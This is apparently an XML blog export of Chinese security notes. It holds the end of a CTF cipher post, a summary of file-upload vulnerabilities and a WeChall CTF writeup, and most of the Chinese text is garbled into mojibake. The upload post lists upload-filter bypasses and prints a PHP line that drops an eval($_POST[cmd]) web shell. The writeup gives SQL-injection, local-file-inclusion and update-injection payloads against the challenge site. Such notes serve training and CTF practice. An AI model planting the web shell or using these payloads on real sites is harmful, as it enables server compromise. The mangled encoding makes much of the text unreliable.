è¾“ï¼Œåœ¨æ¥æ”¶æ–¹å¯¹è¯¥æ–‡ä»¶è¿›è¡Œuudecodeï¼Œå³å°†å…¶è½¬æ¢ä¸ºåˆå§‹çš„äºŒè¿›åˆ¶æ–‡ä»¶ å½¢å¼ï¼šMR,O)^KNYU&gt;;*Q[*[P_?#Q+&quot;AHZS6Q\G,LKNYNZ.LR;;2LK*[N^&amp;CK+/VN/;, MXK:\TJJ]RKZAQ-36K:&amp;CH:,*M/.XQ;3PL+B^S&lt;K&apos;U&gt;+1^;#)=V-T9GMU=75U *=65N8V]D95]??0`` Uuencodeåœ¨çº¿è§£å¯† 0x17 æ›¼åˆ‡æ–¯ç‰¹ç¼–ç æ›¼å½»æ–¯ç‰¹ç¼–ç ï¼ˆManchester Encodingï¼‰ï¼Œä¹Ÿå«åšç›¸ä½ç¼–ç ï¼ˆ Phase Encodeï¼Œç®€å†™PEï¼‰ï¼Œæ˜¯ä¸€ä¸ªåŒæ­¥æ—¶é’Ÿç¼–ç æŠ€æœ¯ï¼Œè¢«ç‰©ç†å±‚ä½¿ç”¨æ¥ç¼–ç ä¸€ä¸ªåŒæ­¥ä½æµçš„æ—¶é’Ÿå’Œæ•°æ®ã€‚ ä»ä½åˆ°é«˜è·³å˜è¡¨ç¤º&quot;0&quot;ï¼Œä»é«˜åˆ°ä½è·³å˜è¡¨ç¤º&quot;1&quot;ã€‚ è¿˜æœ‰ä¸€ç§æ˜¯å·®åˆ†æ›¼å½»æ–¯ç‰¹ç¼–ç ï¼Œæ¯ä½ä¸­é—´çš„è·³å˜ä»…æä¾›æ—¶é’Ÿå®šæ—¶ï¼Œè€Œç”¨æ¯ä½å¼€å§‹æ—¶æœ‰æ— è·³å˜è¡¨ç¤º&quot;0&quot;æˆ–&quot;1&quot;ï¼Œæœ‰è·³å˜ä¸º&quot;0&quot;ï¼Œæ— è·³å˜ä¸º&quot;1&quot;ã€‚ å³: 0-1 è·³å˜è¡¨ç¤º 1,1-0 è·³å˜è¡¨ç¤º 0 ç„¶è€Œä¸€èˆ¬æ¥è¯´æ— çº¿è°ƒåˆ¶ä¸­ï¼Œä¼ æ„Ÿå™¨å’Œ RF å‰ç«¯ä¹‹å‰é€šä¿¡ä¸€èˆ¬ä¼šé‡‡ç”¨ SPI æ¥å£ï¼Œè€Œ SPI æ¥å£æœ‰ä¸¤ç§æ¨¡å¼ï¼Œ MSB First å’Œ LSB Firstï¼Œä¸€èˆ¬åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œéƒ½æ˜¯ MSB Firstï¼Œå¯æ˜¯è¿™é¢˜ä¸æ˜¯ï¼Œæœ‰ç‚¹å¥‡è‘©ï¼Œè¿™é¢˜æ˜¯ LSB First 0x18 å…¶ä»–åŠ å¯†å¸Œå°”å¯†ç  RasåŠ å¯† Rot13åŠ å¯† çŒªåœˆå¯†ç  å½“é“ºå¯†ç  æ‰‹æœºç”µè„‘é”®ç›˜å¯†ç  EscapeåŠ å¯† æ··æ·†åŠ å¯†Aspæ··æ·†åŠ å¯† Phpæ··æ·†åŠ å¯† Css/jsæ··æ·†åŠ å¯† VBScript.Encodeæ··æ·†åŠ å¯†:]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>åŠ å¯†è§£å¯†</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä¸Šä¼ æ¼æ´æ€»ç»“]]></title>
    <url>%2F2016%2F05%2F11%2F%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[æ–‡ä»¶ä¸Šä¼ æ¼æ´æ˜¯æŒ‡ç”¨æˆ·ä¸Šä¼ äº†ä¸€ä¸ªå¯æ‰§è¡Œçš„è„šæœ¬æ–‡ä»¶ï¼Œå¹¶é€šè¿‡æ­¤è„šæœ¬æ–‡ä»¶è·å¾—äº†æ‰§è¡ŒæœåŠ¡å™¨ç«¯å‘½ä»¤çš„èƒ½åŠ›ã€‚è¿™ç§æ”»å‡»æ–¹å¼æ˜¯æœ€ä¸ºç›´æ¥å’Œæœ‰æ•ˆçš„ï¼Œæœ‰æ—¶å€™å‡ ä¹æ²¡æœ‰ä»€ä¹ˆæŠ€æœ¯é—¨æ§›ã€‚ 0x01 ä¸Šä¼ æ£€æµ‹æœºåˆ¶0x01_1 å®¢æˆ·ç«¯javascriptæ£€æµ‹é€šå¸¸æ£€æµ‹çš„æ˜¯æ–‡ä»¶çš„æ‰©å±•å 0x01_2 æœåŠ¡ç«¯MIMEç±»å‹æ£€æµ‹é€šå¸¸æ£€æµ‹çš„æ˜¯Content-Typeå†…å®¹ 0x01_3 æœåŠ¡ç«¯ç›®å½•è·¯å¾„æ£€æµ‹é€šå¸¸è·Ÿpathå‚æ•°ç›¸å…³çš„å†…å®¹ 0x01_4 æœåŠ¡ç«¯æ–‡ä»¶æ‰©å±•åæ£€æµ‹é€šå¸¸æ£€æµ‹è·Ÿæ–‡ä»¶extensionç›¸å…³çš„å†…å®¹ 0x01_5 æœåŠ¡ç«¯æ–‡ä»¶å†…å®¹æ£€æµ‹æ£€æµ‹æ–‡ä»¶å†…å®¹æ˜¯å¦åˆæ³•æˆ–å«æœ‰æ¶æ„ä»£ç  0x02 æ–‡ä»¶ä¸Šä¼ æ¼æ´åˆ©ç”¨0x02_1 javascriptå®¢æˆ·ç«¯éªŒè¯åˆ›å»ºä¸€ä¸ªå…è®¸çš„æ–‡ä»¶ç±»å‹ï¼Œé‡Œé¢å†™å…¥æˆ‘ä»¬éœ€è¦çš„ä»£ç ï¼ŒæŠ“åŒ…ï¼Œæ‹¦æˆªï¼Œä¿®æ”¹ä¸ºå¯æ‰§è¡Œçš„æ¶æ„ä»£ç ã€‚ 0x02_2 MIMEç±»å‹éªŒè¯ç›´æ¥ä¿®æ”¹Content-Typeï¼šå…è®¸çš„MIMEç±»å‹ ä¿®æ”¹æ–‡ä»¶åä¸ºå¯æ‰§è¡Œæ–‡ä»¶ï¼Œæœ‰æ—¶å€™éœ€è¦é…åˆä¿®æ”¹multipart/form-dataçš„å¤§å°å†™ å¸¸è§çš„MIMEç±»å‹ï¼š è¶…æ–‡æœ¬æ ‡è®°è¯­è¨€æ–‡æœ¬ .html text/html xmlæ–‡æ¡£ .xml text/xml æ™®é€šæ–‡æœ¬ .txt text/plain RTFæ–‡æœ¬ .rtf application/rtf PDFæ–‡æ¡£ .pdf application/pdf Microsoft Wordæ–‡ä»¶ .word application/msword PNGå›¾åƒ .png image/png GIFå›¾å½¢ .gif image/gif JPEGå›¾å½¢ .jpeg,.jpg image/jpeg auå£°éŸ³æ–‡ä»¶ .au audio/basic MIDIéŸ³ä¹æ–‡ä»¶ mid,.midi audio/midi,audio/x-midi RealAudioéŸ³ä¹æ–‡ä»¶ .ra, .ram audio/x-pn-realaudio MPEGæ–‡ä»¶ .mpg,.mpeg video/mpeg AVIæ–‡ä»¶ .avi video/x-msvideo GZIPæ–‡ä»¶ .gz application/x-gzip TARæ–‡ä»¶ .tar application/x-tar ä»»æ„çš„äºŒè¿›åˆ¶æ•°æ® application/octet-stream 0x02_3 ç›®å½•è·¯åˆ©ç”¨è§£ææ˜¯ä»å‰å¾€åè§£æï¼Œåˆ¤æ–­æ˜¯ä»åå¾€å‰åˆ¤æ–­ã€‚ é›¶é›¶æˆªæ–­ä¸€èˆ¬æ­¥éª¤ä¸ºï¼š 1.æ–°å»ºä¸€ä¸ªåä¸ºtest.php%00.jpgæˆ–è€…test.php.jpg 2.åœ¨é‡Œé¢å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼ˆ[å¦‚ä½•åœ¨å›¾ç‰‡ä¸­æ’å…¥ä¸€å¥è¯](http://wenku.baidu.com/link?url=GoR21a2WWH2C8c8Q7HIgrz7CoW3B4suAwDaaRkAt6vgCZyYr7Le7Z9ZeiurBIE7NHuNwJ7dro5lCql8mRlk3y2IS7iFbWuQM99HV_kXDvTm)ï¼‰ 3.burpæŠ“åŒ…æ”¹%00æˆ–è€….ä¸ºurlç¼–ç  iisæŒ‰ç…§è·¯å¾„è§£æçš„æ˜¯ï¼š æ¯”å¦‚æˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªåä¸º123.asp/123.jpgæ–‡ä»¶ åˆ™ï¼Œ123.asp/123.jpgä¼šè¢«ç›´æ¥è§£ææˆ123.asp 0x02_4 æ–‡ä»¶æ‰©å±•ååˆ©ç”¨é»‘åå•æ£€æµ‹ æ–‡ä»¶å¤§å°å†™ç»•è¿‡ æ¯”å¦‚åƒAspï¼ŒPhpä¹‹ç±»çš„æ–‡ä»¶åç»•è¿‡é»‘åå•æ£€æµ‹ åå•åˆ—è¡¨ç»•è¿‡ åˆ©ç”¨é»‘åå•é‡Œæ²¡æœ‰çš„åå•è¿›è¡Œæ”»å‡»ï¼Œæ¯”å¦‚é»‘åå•é‡Œæ²¡æœ‰asaï¼Œcerï¼Œphp3ï¼Œphp5ä¹‹ç±»çš„ ç‰¹æ®Šæ–‡ä»¶åç»•è¿‡ ä¿®æ”¹æ–‡ä»¶åä¸ºtest.asp.æˆ–è€…test.asp_ï¼ˆä¸‹åˆ’çº¿ä¸ºç©ºæ ¼ï¼‰ï¼Œç»•è¿‡éªŒè¯ä¹‹åï¼Œwindowsä¼šè‡ªåŠ¨å»æ‰ç‚¹å’Œç©ºæ ¼ï¼Œlinuxå’Œunixä¸‹ä¸æ”¯æŒ 0x00æˆªæ–­ç»•è¿‡ åŒæ‰©å±•åç»•è¿‡ apacheè§£æå¼ä»åå¾€å‰ï¼Œæ‰€ä»¥å¦‚æœä¸Šä¼ ä¸€ä¸ªtest.php.123,ä¸è®¤è¯†.123çš„æ–‡ä»¶ï¼Œæ‰€ä»¥ä¼šå¾€å‰è§£æï¼Œç›´åˆ°é‡åˆ°èƒ½è§£æçš„ .htaccessæ–‡ä»¶æ”»å‡» é…åˆåå•åˆ—è¡¨ç»•è¿‡ï¼Œä¸Šä¼ ä¸€ä¸ªè‡ªå®šä¹‰çš„.htaccessæ–‡ä»¶ï¼Œå°±å¯ä»¥è½»æ¾ç»•è¿‡å„ç§æ£€æµ‹ æ–°å»ºä¸€ä¸ª.htaccessæ–‡ä»¶ ä»£ç ä¸ºï¼š SetHandler application/x-httpd-php ç„¶åä¸Šä¼ ä¸€ä¸ªåŒ…å«testå­—ç¬¦ä¸²çš„æ–‡ä»¶ï¼Œæ²¡æœ‰æ‰©å±•å é‡Œé¢å†™å…¥ä¸€å¥è¯å³å¯ ç™½åå•æ£€æµ‹ %00æˆªæ–­ è§£æè°ƒç”¨/æ¼æ´ç»•è¿‡ é…åˆä¸Šä¼ ä¸€ä¸ªä»£ç æ³¨å…¥è¿‡çš„ç™½åå•æ–‡ä»¶å³å¯ï¼Œå†åˆ©ç”¨è§£æè°ƒç”¨/æ¼æ´ .htaccessæ–‡ä»¶ 0x02_5 æ–‡ä»¶å†…å®¹æ£€æµ‹ç»•è¿‡ æ–‡ä»¶å¤´æ£€æµ‹ jpg-JFIF-FF D8 FF EO 00 10 4A 46 49 46 gif-GIF89a-47 49 46 38 39 61 png-PNG-89 50 4E 47 åœ¨æ–‡ä»¶å¤´åé¢åŠ ä¸Šæ¶æ„ä»£ç å°±è¡Œäº† æ–‡ä»¶ç›¸å…³ä¿¡æ¯æ£€æµ‹ æ–‡ä»¶åŠ è½½æ£€æµ‹ åœ¨æ–‡ä»¶æ³¨é‡Šå¤„æ’å…¥æ¶æ„ä»£ç  0x02_6 è§£ææ¼æ´åˆ©ç”¨Apacheçš„æ‰©å±•åé¡ºåºè§£ææ¼æ´å‘½åä¸ºtest.php.xxxï¼ˆé›†æˆç¯å¢ƒé‡Œphp3éƒ½ä¼šæŒ‰ç…§phpæ¥è§£æï¼‰ IISçš„aspè§£ææ¼æ´ IIS6.0 1.å‘½åä¸ºtest.asp;.jpg 2.å‘½åä¸ºtest.asp/123.jpg(test.aspæ˜¯ä¸€ä¸ªç›®å½•) 3.å‘½åä¸ºtest.asa,test.cer.test.cdx IIS7.5/7.0 åœ¨é»˜è®¤Fast-CGIå¼€å¯çŠ¶å†µä¸‹,ä¸Šä¼ ä¸€ä¸ªåå­—ä¸ºtest.jpgï¼Œå†…å®¹ä¸º &lt;?PHP fputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?php eval($_POST[cmd])?&gt;&apos;);?&gt; çš„æ–‡ä»¶ï¼Œç„¶åè®¿é—®test.jpg/.php,åœ¨è¿™ä¸ªç›®å½•ä¸‹å°±ä¼šç”Ÿæˆä¸€å¥è¯æœ¨é©¬ shell.php Nginxçš„%00è§£ææ¼æ´ å‘½åä¸ºtest.jpg%00.php php-cgiçš„é»˜è®¤é…ç½®æ¼æ´]]></content>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>WAFç»•è¿‡</tag>
        <tag>æ–‡ä»¶ä¸Šä¼ </tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WeChall writeup]]></title>
    <url>%2F2016%2F03%2F04%2FWeChall_writeup%2F</url>
    <content type="text"><![CDATA[WeChall Challage writeup. Trainingï¼šGet Sourced æŸ¥çœ‹æºç  æœ€åé¢ï¼š &lt;!-- You are looking for this password: html_sourcecode --&gt; Training: Stegano Iéšå†™ ä¸‹è½½ä¸‹æ¥ï¼Œä½¿ç”¨notepadæ‰“å¼€ Look what the hex-edit revealed: passwd:steganoI Training: ASCII84, 104, 101, 32, 115, 111, 108, 117, 116, 105, 111, 110, 32, 105, 115, 58, 32, 108, 101, 110, 112, 108, 99, 102, 104, 104, 105, 115, 102 ASCIIè§£ç  The solution is: lenplcfhhisf Training: Crypto - Caesar IVJG SWKEM DTQYP HQZ LWORU QXGT VJG NCBA FQI QH ECGUCT CPF AQWT WPKSWG UQNWVKQP KU DHFUHKPPTRCF å‡¯æ’’è§£å¯†ï¼Œåç§»24 THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG OF CAESAR AND YOUR UNIQUE SOLUTION IS BFDSFINNRPAD Encodings: URL%59%69%70%70%65%68%21%20%59%6F%75%72%20%55%52%4C%20%69%73%20%63%68%61%6C%6C%65%6E%67%65%2F%74%72%61%69%6E%69%6E%67%2F%65%6E%63%6F%64%69%6E%67%73%2F%75%72%6C%2F%73%61%77%5F%6C%6F%74%69%6F%6E%2E%70%68%70%3F%70%3D%6D%61%69%68%68%6D%6F%62%68%69%6E%70%26%63%69%64%3D%35%32%23%70%61%73%73%77%6F%72%64%3D%66%69%62%72%65%5F%6F%70%74%69%63%73%20%56%65%72%79%20%77%65%6C%6C%20%64%6F%6E%65%21 URLç¼–ç ï¼ŒURLè§£ç  Yippeh! Your URL is challenge/training/encodings/url/saw_lotion.php?p=maihhmobhinp&amp;cid=52#password=fibre_optics Very well done! Training: WWW-Robotsè€ƒå¯Ÿrobots.txtï¼ˆç½‘ç»œçˆ¬è™«åè®®ï¼‰ http://www.wechall.net/robots.txt User-agent: * Disallow: /challenge/training/www/robots/T0PS3CR3T Prime Factoryæ‰¾åˆ°ç¬¬ä¸€ä¸ªå’Œç¬¬äºŒä¸ªå¤§äº1ç™¾ä¸‡ï¼Œå¹¶ä¸”æ¯ä¸ªä½ä¸Šçš„æ•°å­—çš„å’Œéƒ½æ˜¯ç´ æ•°çš„ç´ æ•°ã€‚ ä»£ç å¦‚ä¸‹ï¼š def iszhishu(n): for i in range(2,n): if n % i ==0: return False return True def sum(n): count = 0 for t in range(len(n)): count += int(n[t]) if iszhishu(count): return True else: return False for num in range(1000001,9999999): if iszhishu(num): if sum(str(num)): print(int(num)) å–å‰ä¸¤ä¸ª 1000033 1000037 PHP 0817æœ¬åœ°æ–‡ä»¶åŒ…å«ï¼Œä»£ç å¦‚ä¸‹ï¼š &lt;?php if (isset($_GET[&apos;which&apos;])) { $which = $_GET[&apos;which&apos;]; switch ($which) { case 0: case 1: case 2: require_once $which.&apos;.php&apos;; break; default: echo GWF_HTML::error(&apos;PHP-0817&apos;, &apos;Hacker NoNoNo!&apos;, false); break; } } è¦æ±‚æ˜¯åŒ…å«solution.php. http://www.wechall.net/challenge/php0817/index.php?which=solution Training: MySQL Iç®€å•çš„sqlæ³¨å…¥ ä¸‡èƒ½å¯†é’¥ï¼š adminâ€™orâ€™1â€™=â€™1 Training: Programming 1å°±æ˜¯ä¸€ä¸ªç®€å•çš„postæ•°æ®åŒ…ã€‚ å°±æ˜¯å…ˆè·å–ç”Ÿæˆéšæœºæ•°é‚£ä¸ªé¡µé¢çš„ http å¤´ã€‚ç„¶åæŠŠè‡ªå·±çš„ Cookie åŠ ä¸Šå»ã€‚ ç„¶åè¯·æ±‚è¿™ä¸ªé¡µé¢ï¼Œå¾—åˆ°å­—ç¬¦ä¸²ï¼Œå°†å…¶æ‹¼æ¥åœ¨æäº¤é¡µé¢çš„ url ä¸Šã€‚ å†è¯·æ±‚æäº¤é¡µé¢çš„ http å¤´ï¼Œå¹¶æ·»åŠ è‡ªå·±çš„ Cookieï¼Œæœ€åè¯·æ±‚å³å¯ã€‚ Warning: è¿™ä¸ªç½‘ç«™åœ¨å›½å¤–ï¼Œä½†æ˜¯æ‰“å¼€ä¸€ä¸ªé¡µé¢å°±è¦ 1 ç§’å¤šã€‚æ‰€ä»¥å›½å†…è·‘è¿™ä¸ªè„šæœ¬è‚¯å®šè¶…æ—¶ã€‚è¿™æ—¶å€™ä½ å°±éœ€è¦ä¸€å°å›½å¤–æœåŠ¡å™¨æ¥è·‘è¿™ä¸ªè„šæœ¬ã€‚ Training: PHP LFIæœ¬åœ°æ–‡ä»¶åŒ…å«+é›¶é›¶æˆªæ–­ã€‚ æºç å¦‚ä¸‹ï¼š $filename = &apos;pages/&apos;.(isset($_GET[&quot;file&quot;])?$_GET[&quot;file&quot;]:&quot;welcome&quot;).&apos;.html&apos;; include $filename; ä¼šåœ¨fileçš„å‰é¢åŠ ä¸Špages/åé¢åŠ ä¸Šwelcome æ‰€ä»¥ç»“æœå°±æ˜¯ï¼špages/file.html æ‰€ä»¥æ„é€ å¦‚ä¸‹ä»£ç ï¼š http://www.wechall.net/challenge/training/php/lfi/up/index.php?file=../../solution.php%00 Training: Encodings Iæœ¬æ¥æŒ‰ç…§æ­£å¸¸æ€è·¯æ˜¯å…ˆ8ä¸ª8ä¸ªä¸€ç»„ï¼Œåˆ†åˆ°æœ€åå‘ç°ä¸å¯¹ï¼Œä¸æ˜¯8çš„å€æ•°ã€‚ç„¶åç™¾åº¦ï¼ŒåŸæ¥é‡ç‚¹æ˜¯æç¤ºçš„ï¼šEnglishã€‚ è‹±æ–‡å­—æ¯æ‰€ç”¨çš„asciiå­—ç¬¦åªå ç”¨ä¸ƒä¸ªbitï¼ˆå³7ä½ï¼‰ è„šæœ¬å¦‚ä¸‹ï¼š str1=&quot;101010011010001101001111001101000001110100110010111110001110100010000011010011110011010000001101110101101110001011010011110100010000011001011101110110001111011111100100110010111001000100000110000111100111100011110100111010010101110010000010110011101111111010111100100100000111000011000011110011111001111101111101111111001011001000100000110100111100110100000110010111000011110011111100111100111110100110000111100101110100110010111100100101110&quot; print len(str1) def res(str1): length = len(str1) for i in range(length/7): yield str1[i*7:(i+1)*7] s=&quot;&quot; for r in res(str1): s += chr(int(r,2)) //å°†äºŒè¿›åˆ¶çš„å­—ç¬¦ä¸²å˜æˆæ•´å½¢çš„åè¿›åˆ¶ print s yieldå…³é”®å­—ç”¨æ¥å®šä¹‰ç”Ÿæˆå™¨ï¼ˆGeneratorï¼‰ï¼Œå…¶å…·ä½“åŠŸèƒ½æ˜¯å¯ä»¥å½“returnä½¿ç”¨ï¼Œä»å‡½æ•°é‡Œè¿”å›ä¸€ä¸ªå€¼ï¼Œä¸åŒä¹‹å¤„æ˜¯ç”¨yieldè¿”å›ä¹‹åï¼Œå¯ä»¥è®©å‡½æ•°ä»ä¸Šå›yieldè¿”å›çš„åœ°ç‚¹ç»§ç»­æ‰§è¡Œã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œyieldè¿”å›å‡½æ•°ï¼Œäº¤ç»™è°ƒç”¨è€…ä¸€ä¸ªè¿”å›å€¼ï¼Œç„¶åå†â€œç¬ç§»â€å›å»ï¼Œè®©å‡½æ•°ç»§ç»­è¿è¡Œï¼Œ ç›´åˆ°å“ä¸€è·³yieldè¯­å¥å†è¿”å›ä¸€ä¸ªæ–°çš„å€¼ã€‚ int(r,2)2æ˜¯è¡¨ç¤ºè½¬åŒ–ä¸ºåè¿›åˆ¶ï¼Œé»˜è®¤çš„æ˜¯0 This text is 7-bit encoded ascii. Your password is easystarter. Training: Crypto - Transposition Iç½®æ¢å¯†ç ï¼šå°±æ˜¯æ˜æ–‡çš„å­—æ¯ä¿æŒç›¸åŒï¼Œä½†é¡ºåºè¢«æ‰“ä¹±äº†ã€‚ å¯†æ–‡å¦‚ä¸‹ï¼š oWdnreuf.lY uoc nar ae dht eemssga eaw yebttrew eh nht eelttre sra enic roertco drre . Ihtni koy uowlu dilekt oes eoyrup sawsro don:wa nrrabflmag.b è„šæœ¬å¦‚ä¸‹ï¼š s=&apos;oWdnreuf.lY uoc nar ae dht eemssga eaw yebttrew eh nht eelttre sra enic roertco drre . Ihtni koy uowlu dilekt oes eoyrup sawsro don:wa msmniaocam.d&apos; for i in range(0,len(s),2): res=&apos;&apos; t= (s[i + 1] + s[i]) res +=t print res è¯´æ˜ï¼šå­—ç¬¦ä¸²çš„é•¿åº¦ä¸º148ï¼Œæ‰€ä»¥å¯ä»¥æ¢çš„è¯å°±æœ‰ï¼š ä¸¤ä¸¤äº’æ¢å³oï¼ŒWäº’æ¢ï¼Œdï¼Œnäº’æ¢â€¦å…±74å¯¹ å››å››äº’æ¢å³oWdnï¼Œreufäº’æ¢ï¼Œ.lY ï¼Œuoc äº’æ¢â€¦å…±37å¯¹ 37,37äº’æ¢â€¦ 74,74äº’æ¢â€¦ Wonderful. You can read the message way better when the letters are in correct order. I think you would like to see your password now: asmnmaicomad. Training: Register GlobalsPHPå…¨å±€å˜é‡ æºç å¦‚ä¸‹ï¼š ... if (isset($login)) { echo GWF_HTML::message(&apos;Register Globals&apos;, $chall-&gt;lang(&apos;msg_welcome_back&apos;, array(htmlspecialchars($login[0]), htmlspecialchars($login[1])))); if (strtolower($login[0]) === &apos;admin&apos;) { $chall-&gt;onChallengeSolved(GWF_Session::getUserID()); } ... ä»£ç ä¸­æ£€æµ‹loginï¼Œå¦‚æœlogin[0]=â€™adminâ€™è¾“å‡ºä¿¡æ¯ã€‚ æ„é€ ä»£ç å¦‚ä¸‹ï¼š http://www.wechall.net/challenge/training/php/globals/globals.php?login[0]=admin No Escapeupdateæ³¨å…¥ å¦‚æœä¸€ç›´ç‚¹ä¸€ä¸ªäººçš„è¯ï¼Œä¼šä¸€ç›´å¢é•¿ï¼Œå¦‚æœæœ‰äººè¾¾åˆ°100ï¼Œæ‰€æœ‰äººé‡ç½®ã€‚ æ‰§è¡Œä»¥ä¸‹ä»£ç ï¼š http://www.wechall.net/challenge/no_escape/index.php?vote_for=bil å›æ˜¾ä¸ºï¼š GDO Error(1054): Unknown column â€˜bilâ€™ in â€˜field listâ€™UPDATE noescvotes SET bil=bil+1 WHERE id=1 æ„é€ å¦‚ä¸‹è¯­å¥ï¼š bill`=111%23 åˆ™sqlè¯­å¥ä¸ºï¼š UPDATE noescvotes SET bill=111%23=bill`+1 WHERE id=1 æ„é€ URLï¼š http://www.wechall.net/challenge/no_escape/?vote_for=bill`=111%23 Training: Crypto - Substitution Iå•è¡¨ç½®æ¢å¯†ç  å¯†æ–‡å¦‚ä¸‹ï¼š DK OAM VTFXLAOK LIG KIQ PVE BMVG OAXH FK RBXMEG X VF XFZBMHHMG YMBK CMTT GIEM KIQB HITQOXIE UMK XH ZMFLMZXAFEXL OAXH TXOOTM PAVTTMELM CVH EIO OII AVBG CVH XO å¯†é’¥çŸ­è¯­å¯†ç å°±æ˜¯é€‰ä¸€ä¸ªè‹±æ–‡çŸ­è¯­ä½œä¸ºå¯†é’¥å­—(Key Word)æˆ–å¯†é’¥çŸ­è¯­(Key Phrase)ï¼Œå¦‚HAPPY NEW YEARï¼Œå»æ‰é‡å¤å­—æ¯å¾—HAPYNEWRã€‚å°†å®ƒä¾æ¬¡å†™åœ¨æ˜æ–‡å­—æ¯è¡¨ä¹‹ä¸‹ï¼Œè€Œåå†å°†å­—æ¯è¡¨ä¸­æœªåœ¨çŸ­è¯­ä¸­å‡ºç°è¿‡çš„å­—æ¯ä¾æ¬¡å†™äºæ­¤çŸ­è¯­ä¹‹åï¼Œå°±å¯æ„é€ å‡ºä¸€ä¸ªå­—æ¯ä»£æ¢è¡¨ï¼š å¯¹ç…§è¡¨å°±è¡Œäº†ã€‚ å…è´¹ç ´è§£åœ°å€ BY THE ALMIGHTY GOD YOU CAN READ THIS MY FRIEND I AM IMPRESSED VERY WELL DONE YOUR SOLUTION KEY IS PEMGEPIHMNIG THIS LITTLE CHALLENGE WAS NOT TOO HARD WAS IT hiè¯´äº†é‚£ä¹ˆå¤šå±è¯ï¼Œå°±æ˜¯ä¸€ä¸ªç­‰å·®æ•°åˆ—ã€‚ ç¬¬ä¸€åˆ†é’Ÿæ˜¯2ï¼Œä»¥åä¾æ¬¡åŠ ä¸€ï¼Œæœ€åä¸€é¡¹æ˜¯17591026060781 æ‰€ä»¥æ€»å…±æœ‰(2+17591026060781)*17591026060781/2 å‘ç°ç»“æœç«Ÿç„¶æ˜¯å°æ•°ï¼Œæ”¹ä¸º(2+17591026060782)*17591026060782/2ç«Ÿç„¶å¯¹äº†ã€‚ã€‚ã€‚ Training: MySQL II.htaccess username passwordåˆ†å¼€æ¥éªŒè¯ã€‚é€šå¸¸çš„åˆ©ç”¨æ–¹æ³•æ˜¯ä½¿ç”¨unionæ„é€ å·²çŸ¥MD5å€¼çš„æŸ¥è¯¢ã€‚ æ„é€ è¯­å¥ï¼š username=-1&apos; union select 1,&apos;admin&apos;,&apos;e10adc3949ba59abbe56e057f20f883e&apos; %23&amp;password=123456&amp;login=Login è¿™å¥è¯é¦–å…ˆé€šè¿‡username=-1å°†åŸè¯­å¥æŠ¥é”™ã€‚å› æ­¤è¿”å›çš„å°†ä¼šæ˜¯ç¬¬äºŒæ¡è¯­å¥äº§ç”Ÿçš„ä¿¡æ¯ã€‚è€Œæˆ‘ä»¬union selectçš„æ˜¯ç›´æ¥æ„é€ äº†ç”¨æˆ·åä¸ºadminï¼Œå¯†ç ä¸º123456çš„md5å€¼ã€‚è¿™æ ·å°±å¯ä»¥è®©ç¨‹åºè¯¯è®¤ä¸ºæˆ‘ä»¬æ„é€ çš„ä¿¡æ¯å°±æ˜¯å®ƒä»æ•°æ®åº“é‡Œé¢æå–å¾—åˆ°çš„ä¿¡æ¯ã€‚ Limited Accessè®©æˆ‘ä»¬è®¿é—®.htaccess æºç å¦‚ä¸‹ï¼š AuthUserFile .htpasswd AuthGroupFile /dev/null AuthName &quot;Authorization Required for the Limited Access Challenge&quot; AuthType Basic &lt;Limit GET&gt;require valid-user &lt;/Limit&gt; æºç ä¸­é™åˆ¶äº†GET æ‰€ä»¥ä½¿ç”¨postå³å¯ Training: Regexæ­£åˆ™è¡¨è¾¾å¼ åŒ¹é…ä¸€ä¸ªç©ºå­—ç¬¦å°±è¡Œäº†ã€‚ æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…ç©ºå€¼æ–¹å¼å¦‚ä¸‹ï¼š \b åŒ¹é…å•è¯å¼€å¤´æˆ–ç»“å°¾ä½ç½® ^ åŒ¹é…å­—ç¬¦ä¸²å¼€ç«¯ä½ç½® $ åŒ¹é…å­—ç¬¦ä¸²ç»“å°¾ä½ç½® \s åŒ¹é…ä¸€åˆ‡ç©ºç™½å­—ç¬¦ \n åŒ¹é…æ¢è¡Œ ä»£ç å¦‚ä¸‹ï¼š /^$/ Training: Crypto - Caesar IIs = &apos;77 1F 1F 14 20 1A 1F 12 5C 20 29 1F 25 20 23 1F 1C 26 15 14 20 1F 1E 15 20 1D 1F 22 15 20 13 18 11 1C 1C 15 1E 17 15 20 19 1E 20 29 1F 25 22 20 1A 1F 25 22 1E 15 29 5E 20 04 18 19 23 20 1F 1E 15 20 27 11 23 20 16 11 19 22 1C 29 20 15 11 23 29 20 24 1F 20 13 22 11 13 1B 5E 20 07 11 23 1E 57 24 20 19 24 6F 20 61 62 68 20 1B 15 29 23 20 19 23 20 11 20 21 25 19 24 15 20 23 1D 11 1C 1C 20 1B 15 29 23 20 11 13 15 5C 20 23 1F 20 19 24 20 23 18 1F 25 1C 14 1E 57 24 20 18 11 26 15 20 24 11 1B 15 1E 20 29 1F 25 20 24 1F 1F 20 1C 1F 1E 17 20 24 1F 20 14 15 13 22 29 20 24 20 24 18 19 23 20 1D 15 23 23 11 17 15 5E 20 07 15 1C 1C 20 14 1F 1E 15 5C 20 29 1F 25 22 20 23 1F 1C 25 24 19 1F 1E 20 19 23 20 1D 20 23 11 22 22 15 23 20 1D 1E 17 5E&apos; s = s.split() for key in range(0,128+1,1): for i in s: i = int(i,16) print (chr((i + key + 256) % 256 ), end = &apos;&apos;) print (key) key=80æ—¶ Ã‡oodpjobÂ¬pyoupsolvedponepmorepchallengepinpyourpjourneyÂ®pThisponepwaspfairlypeasyptopcrackÂ®pWasnÂ§tpitÂ¿pÂ±Â²Â¸pkeyspispapquitepsmallpkeyspaceÂ¬psopitpshouldnÂ§tphaveptakenpyouptooplongptopdecryptpthispmessageÂ®pWellpdoneÂ¬pyourpsolutionpispmpsarrespmngÂ® Stegano Attachmentä¸‹è½½å›¾ç‰‡ä¹‹åï¼Œnotepadæ‰“å¼€ å‘ç°ï¼šsolution.txt æ”¹åç¼€ä¸ºrar IDSRGRNENMPS Training: 